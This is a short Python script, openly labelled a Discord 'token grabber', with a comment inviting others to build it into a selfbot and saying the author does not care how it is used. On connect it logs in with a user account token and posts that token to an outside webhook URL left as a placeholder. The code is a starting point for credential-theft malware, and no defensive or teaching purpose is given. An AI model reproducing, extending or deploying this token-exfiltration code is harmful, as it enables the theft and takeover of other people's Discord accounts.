#Incredibly basic token grabber that the user must use, add shit to it and make it a selfbot.
#i dont care what you do with this 
import discord, aiohttp
from discord import Webhook, AsyncWebhookAdapter
t = ""  #token
class MyClient(discord.Client):
  async def on_connect(self):
      print(f"token grabbed")
      async with aiohttp.ClientSession() as session:
          webhook = Webhook.from_url("URL HERE", adapter=AsyncWebhookAdapter(session))
          await webhook.send(f"||{t}||")



client = MyClient()
try:
 client.run(t, bot=False)
except discord.LoginFailure:
 print(f"invalid")
